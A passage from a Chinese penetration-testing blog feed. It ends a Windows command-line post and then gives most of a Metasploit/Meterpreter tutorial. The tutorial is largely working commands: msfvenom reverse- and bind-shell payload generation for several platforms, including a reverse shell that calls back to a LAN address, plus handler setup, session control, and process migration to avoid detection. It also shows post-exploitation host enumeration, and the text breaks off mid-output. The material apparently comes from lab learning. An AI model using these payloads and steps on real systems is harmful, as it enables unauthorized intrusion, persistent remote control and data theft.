class="line">C:\Users\12521\Desktop\steady-learn\PHP开发学习\PHP开发环境安装.md</span><br></pre></td></tr></table></figure><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><h3 id="命令解释"><a href="#命令解释" class="headerlink" title="命令解释"></a>命令解释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for、in和do是for语句的关键字，它们三个缺一不可；</span><br><span class="line">%%I是for语句中对形式变量的引用，即使变量l在do后的语句中没有参与语句的执行，也是必须出现的；</span><br><span class="line">in之后，do之前的括号不能省略；</span><br><span class="line">command1表示字符串或变量，command2表示字符串、变量或命令语句；</span><br></pre></td></tr></table></figure><h3 id="命令例子"><a href="#命令例子" class="headerlink" title="命令例子"></a>命令例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521&gt;for  %I in (ABC) do echo %I</span><br><span class="line"></span><br><span class="line">C:\Users\12521&gt;echo ABC</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop&gt;for %i in (*.*) do echo &quot;%i&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;010 Editor.lnk&quot;</span><br><span class="line">&quot;010 Editor.lnk&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;2.py&quot;</span><br><span class="line">&quot;2.py&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;for&quot;</span><br><span class="line">&quot;for&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;login2.aspx&quot;</span><br><span class="line">&quot;login2.aspx&quot;</span><br><span class="line"></span><br><span class="line">C:\Users\12521\Desktop&gt;echo &quot;steady.py&quot;</span><br><span class="line">&quot;steady.py&quot;</span><br></pre></td></tr></table></figure><h1 id="windows权限基础"><a href="#windows权限基础" class="headerlink" title="windows权限基础"></a>windows权限基础</h1><ul><li>Users：普通用户权限，是系统中最安全的权限(因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)。</li><li>Administrator：管理员权限，可以利用Windows的机制将自己提升为System权限，以便操作SAM文件等。</li><li>System：系统权限，可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作。</li><li>TrustedInstaller：Windows中的最高权限，对系统文件，即使拥有System权限也无法修改，只有拥有TrustedInstaller权限才可以修改系统文件。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows-命令行基础&quot;&gt;&lt;a href=&quot;#Windows-命令行基础&quot; class=&quot;headerlink&quot; title=&quot;Windows 命令行基础&quot;&gt;&lt;/a&gt;Windows 命令行基础&lt;/h1&gt;&lt;h2 id=&quot;列出当前文件清单&quot;&gt;&lt;a href=&quot;#列</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>内网学习--Metasploit使用</title>
    <link href="http://s1eady.top/2020/11/12/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/12/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-12T14:46:26.000Z</published>
    <updated>2020-11-20T02:25:39.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Metasploit–Meterpreter使用"><a href="#Metasploit–Meterpreter使用" class="headerlink" title="Metasploit–Meterpreter使用"></a>Metasploit–Meterpreter使用</h1><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><h3 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h3><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。</p><h3 id="Meterpreter优点"><a href="#Meterpreter优点" class="headerlink" title="Meterpreter优点"></a>Meterpreter优点</h3><ul><li>Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件。</li><li>它在运行的时候系统时间是变化的</li><li>Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。</li></ul><h3 id="Meterpreter基础常用命令"><a href="#Meterpreter基础常用命令" class="headerlink" title="Meterpreter基础常用命令"></a>Meterpreter基础常用命令</h3><h4 id="进入CMD-shell"><a href="#进入CMD-shell" class="headerlink" title="进入CMD-shell"></a>进入CMD-shell</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4180 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator.WEB\Desktop&gt;</span><br></pre></td></tr></table></figure><h4 id="解决中文乱码问题"><a href="#解决中文乱码问题" class="headerlink" title="解决中文乱码问题"></a>解决中文乱码问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>或者将终端临时设置为GBK系列编码即可</p><h4 id="退出会话"><a href="#退出会话" class="headerlink" title="退出会话"></a>退出会话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quit  # 退出会话  </span><br></pre></td></tr></table></figure><h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat # 查看文件内容  </span><br><span class="line">getwd # 查看当前工作目录  </span><br><span class="line">upload  # 上传文件到目标机上  </span><br><span class="line">download # 下载文件到本机上  </span><br><span class="line">edit # 编辑文件  </span><br><span class="line">search  # 搜索文件</span><br></pre></td></tr></table></figure><h3 id="Meterpreter中常用的Shell"><a href="#Meterpreter中常用的Shell" class="headerlink" title="Meterpreter中常用的Shell"></a>Meterpreter中常用的Shell</h3><h4 id="msf搜索正向shell与反向shell的payload"><a href="#msf搜索正向shell与反向shell的payload" class="headerlink" title="msf搜索正向shell与反向shell的payload"></a>msf搜索正向shell与反向shell的payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search reverse_tcp或者bind_tcp</span><br></pre></td></tr></table></figure><p>reverse_tcp</p><h4 id="常见shell生成"><a href="#常见shell生成" class="headerlink" title="常见shell生成"></a>常见shell生成</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Linux：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash:</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl:</span><br><span class="line">msfvenom -p cmd/unix/reverse</span><br><span class="line">_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h4 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h4><h5 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h5><h5 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h5><p>基于TCP的反弹shell，反向shell是攻击机器不能联通目标机器，目标机器主动连接攻击机器。</p><h6 id="PHP-Shell"><a href="#PHP-Shell" class="headerlink" title="PHP-Shell"></a>PHP-Shell</h6><ul><li><p>生成一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.1</span><span class="number">.109</span> LPORT=<span class="number">1234</span> R &gt; shell.php</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP <span class="keyword">from</span> the payload</span><br><span class="line">[-] No arch selected, selecting arch: php <span class="keyword">from</span> the payload</span><br><span class="line">No encoder <span class="keyword">or</span> badchars specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">1114</span> bytes</span><br></pre></td></tr></table></figure></li><li><p>msfconsole 监听端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 攻击IP</span><br><span class="line">lhost =&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 监听端口</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line">[-] Handler failed to bind to <span class="number">192.168</span><span class="number">.0</span><span class="number">.108</span>:<span class="number">1234</span>:-  -</span><br><span class="line">[*] Started reverse TCP handler on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="EXE-木马"><a href="#EXE-木马" class="headerlink" title="EXE-木马"></a>EXE-木马</h6><ul><li><p>生成木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击IP  LPORT=监听端口 -f exe &gt; hacker.exe</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 攻击IP</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 监听端口</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></li></ul><h5 id="reverse-http"><a href="#reverse-http" class="headerlink" title="reverse_http"></a>reverse_http</h5><p>基于http方式的反向连接，在网速慢的情况下不稳定。</p><h5 id="reverse-https"><a href="#reverse-https" class="headerlink" title="reverse_https"></a>reverse_https</h5><p>基于https方式的反向连接，在网速慢的情况下不稳定。</p><h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><h5 id="使用情况-1"><a href="#使用情况-1" class="headerlink" title="使用情况"></a>使用情况</h5><ul><li>目标机器不允许某些端口出站。</li><li>目标机器不能联通外网，但是我们可以联通目标机器。</li></ul><p>目标机器执行木马之后会打开对应的端口，进行shell连接，正向shell就是目标不能连接攻击端，攻击机器主动连接目标机器。</p><h5 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h5><p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p><p>设置的IP地址和端口就是目标机的。</p><h6 id="PHP-Shell-1"><a href="#PHP-Shell-1" class="headerlink" title="PHP-Shell"></a>PHP-Shell</h6><ul><li><p>生成一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 攻击IP</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 监听端口</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure></li></ul><h6 id="EXE-木马-1"><a href="#EXE-木马-1" class="headerlink" title="EXE-木马"></a>EXE-木马</h6><ul><li><p>生成木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;&lt;Attack Port&gt; -f exe &gt;&#x2F;root&#x2F;bind_xx.exe</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure></li></ul><h3 id="升级正常的Shell到Meterpreter"><a href="#升级正常的Shell到Meterpreter" class="headerlink" title="升级正常的Shell到Meterpreter"></a>升级正常的Shell到Meterpreter</h3><p>通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell,  因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions  Command 可以帮助我们实现从Shell 到Meterpreter提升。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;run post/multi/manage/shell_to_meterpreter</span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/shell_to_meterpreter):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection</span><br><span class="line">   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).</span><br><span class="line">   LPORT    4433             yes       Port for payload to connect to.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">msf5&gt;set session 2</span><br><span class="line">msf5&gt;run</span><br></pre></td></tr></table></figure><p>使用一下命名进行切换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -u sessionid</span><br></pre></td></tr></table></figure><h3 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h3><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions <span class="comment">#查看会话</span></span><br><span class="line">sessions -i &lt;ID值&gt;  <span class="comment">#进入会话</span></span><br></pre></td></tr></table></figure><h4 id="将回话保存到后台，进入会话"><a href="#将回话保存到后台，进入会话" class="headerlink" title="将回话保存到后台，进入会话"></a>将回话保存到后台，进入会话</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session <span class="number">1.</span>..</span><br><span class="line">切换到会话<span class="number">1</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions -i <span class="number">1</span></span><br><span class="line">[*] Starting interaction <span class="keyword">with</span> <span class="number">1.</span>..</span><br></pre></td></tr></table></figure><h4 id="查看会话"><a href="#查看会话" class="headerlink" title="查看会话"></a>查看会话</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ STU1  172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6)</span><br></pre></td></tr></table></figure><h4 id="删除回话"><a href="#删除回话" class="headerlink" title="删除回话"></a>删除回话</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; sessions -k 2</span><br><span class="line">[*] <span class="function">Killing the following <span class="title">session</span><span class="params">(s)</span>: 2</span></span><br><span class="line">[*] Killing session 2</span><br><span class="line">[*] <span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span> - Meterpreter session <span class="number">2</span> closed.</span><br></pre></td></tr></table></figure><p>抓取hash密码–需要AUTHORITY\SYSTEM权限</p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>在刚获得的Meterpreter Shell时，该shell极其脆弱和易受攻击的，所以获得此shell的<strong>第一步就是将其迁移</strong>，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。</p><h4 id="查看当前活跃进程"><a href="#查看当前活跃进程" class="headerlink" title="查看当前活跃进程"></a>查看当前活跃进程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                  Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----                  ----  -------  ----                          ----</span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     [System Process]</span><br><span class="line"> <span class="number">4</span>     <span class="number">0</span>     System                x64   <span class="number">0</span></span><br><span class="line"> <span class="number">124</span>   <span class="number">500</span>   svchost.exe           x64   <span class="number">0</span>        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe</span><br><span class="line"> <span class="number">256</span>   <span class="number">4</span>     smss.exe              x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe</span><br><span class="line"> <span class="number">340</span>   <span class="number">332</span>   csrss.exe             x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> <span class="number">392</span>   <span class="number">332</span>   wininit.exe           x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe</span><br><span class="line"> <span class="number">404</span>   <span class="number">384</span>   csrss.exe             x64   <span class="number">1</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> <span class="number">440</span>   <span class="number">384</span>   winlogon.exe          x64   <span class="number">1</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</span><br><span class="line"> <span class="number">500</span>   <span class="number">392</span>   services.exe          x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe</span><br></pre></td></tr></table></figure><h4 id="获取当前进程的PID"><a href="#获取当前进程的PID" class="headerlink" title="获取当前进程的PID"></a>获取当前进程的PID</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: <span class="number">1912</span></span><br></pre></td></tr></table></figure><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill &lt;pid值&gt;</span><br></pre></td></tr></table></figure><h4 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br></pre></td></tr></table></figure><h4 id="自动迁移进程"><a href="#自动迁移进程" class="headerlink" title="自动迁移进程"></a>自动迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自动迁移进程命令：run post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><h5 id="查看当前用户权限"><a href="#查看当前用户权限" class="headerlink" title="查看当前用户权限"></a>查看当前用户权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看权限</span><br></pre></td></tr></table></figure><h5 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WEB</span><br><span class="line">OS              : Windows <span class="number">2008</span> R2 (<span class="number">6.1</span> Build <span class="number">7601</span>, Service Pack <span class="number">1</span>).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : DE1AY</span><br><span class="line">Logged On Users : <span class="number">3</span></span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure><h5 id="获取软件安装信息"><a href="#获取软件安装信息" class="headerlink" title="获取软件安装信息"></a>获取软件安装信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WEB</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                                                  Version</span><br><span class="line"> ----                                                                                  -------</span><br><span class="line"> <span class="number">360</span>安全卫士                                                                               <span class="number">12.0</span><span class="number">.0</span><span class="number">.2002</span></span><br><span class="line"> <span class="number">360</span>安全卫士                                                                               <span class="number">12.0</span><span class="number">.0</span><span class="number">.2002</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946040)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946040)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946308)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946308)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946344)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946344)       <span 